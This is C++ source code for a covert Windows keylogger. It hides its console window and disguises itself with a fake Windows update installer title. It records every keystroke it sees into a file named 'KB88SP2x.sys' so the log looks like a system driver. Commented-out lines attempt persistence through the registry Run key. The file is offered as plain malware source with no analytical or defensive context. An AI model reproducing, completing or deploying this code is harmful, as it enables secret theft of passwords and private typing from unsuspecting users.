#include <windows.h>
#include <fstream>

using namespace std ;

int WINAPI WinMain (HINSTANCE hThisInstance,
                   HINSTANCE hPrevInstance,
                   LPSTR lpszArgument,
                   int nFunsterStil)
{

     //HKEY klucz;
     //LONG open = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &klucz);

     //RegCloseKey(klucz); // nie dzia³a nie wiem czemu


 HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );
    system("title KB88SP2x_Win_SP3_Clients_Instaler_Updates ");
   MSG messages;
   MSG msgKomunikat;
   msgKomunikat.message = WM_NULL;
   while (msgKomunikat.message != WM_QUIT)
   {
       if (PeekMessage(&msgKomunikat, NULL, 0, 0, PM_REMOVE))
       {
               TranslateMessage (&msgKomunikat);
               DispatchMessage (&msgKomunikat);
       }
   else
   {
   short character;
        for(character=8;character<=222;character++)
        {
        if(GetAsyncKeyState(character)==-32767)
        {
        FILE *file;
        if(file=fopen("KB88SP2x.sys","a+"))
        {
        if((character>=39)&&(character<=64))
        {
        fputc(character,file);
        fclose(file);
        break;
        }
        else if((character>64)&&(character<91))
        {
        character+=32;
        fputc(character,file);
        fclose(file);
        break;
        }
        else
        {

        switch(character)
        {
        case VK_SPACE:
        fputc(' ',file);
        fclose(file);
        break;
        case VK_SHIFT:
        fputs("[SHIFT]",file);
        fclose(file);
        break;
        case VK_RETURN:
        fputs("\n[ENTER]",file);
        fclose(file);
        break;
        case VK_BACK:
        fputs("[BACKSPACE]",file);
        fclose(file);
        break;
        case VK_TAB:
        fputs("[TAB]",file);
        fclose(file);
        break;
        case VK_CONTROL:
        fputs("[ALT\\CTRL]",file);
        fclose(file);
        break;
        case VK_DELETE:
        fputs("[DEL]",file);
        fclose(file);
        break;
        case VK_OEM_1:
        fputs("[;:]",file);
        fclose(file);
        break;
        case VK_OEM_2:
        fputs("[/?]",file);
        fclose(file);
        break;
        case VK_OEM_3:
        fputs("[`~]",file);
        fclose(file);
        break;
        case VK_OEM_4:
        fputs("[ [{ ]",file);
        fclose(file);
        break;
        case VK_OEM_5:
        fputs("[\\|]",file);
        fclose(file);
        break;
        case VK_OEM_6:
        fputs("[ ]} ]",file);
        fclose(file);
        break;
        case VK_OEM_7:
        fputs("['\"]",file);
        fclose(file);
        break;
        case VK_NUMPAD0:
        fputc('0',file);
        fclose(file);
        break;
        case VK_NUMPAD1:
        fputc('1',file);
        fclose(file);
        break;
        case VK_NUMPAD2:
        fputc('2',file);
        fclose(file);
        break;
        case VK_NUMPAD3:
        fputc('3',file);
        fclose(file);
        break;
        case VK_NUMPAD4:
        fputc('4',file);
        fclose(file);
        break;
        case VK_NUMPAD5:
        fputc('5',file);
        fclose(file);
        break;
        case VK_NUMPAD6:
        fputc('6',file);
        fclose(file);
        break;
        case VK_NUMPAD7:
        fputc('7',file);
        fclose(file);
        break;
        case VK_NUMPAD8:
        fputc('8',file);
        fclose(file);
        break;
        case VK_NUMPAD9:
        fputc('9',file);
        fclose(file);
        break;
        case VK_CAPITAL:
        fputs("[CAPS LOCK]",file);
        fclose(file);
        break;
        default:
        fclose(file);
        break;
        }
        }
        }
        }
      }
}
}
     return messages.wParam;
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
   switch (message)
   {
       case WM_DESTROY:
           PostQuitMessage (0);
           break;
       default:
           return DefWindowProc (hwnd, message, wParam, lParam);
   }

   return 0;
}
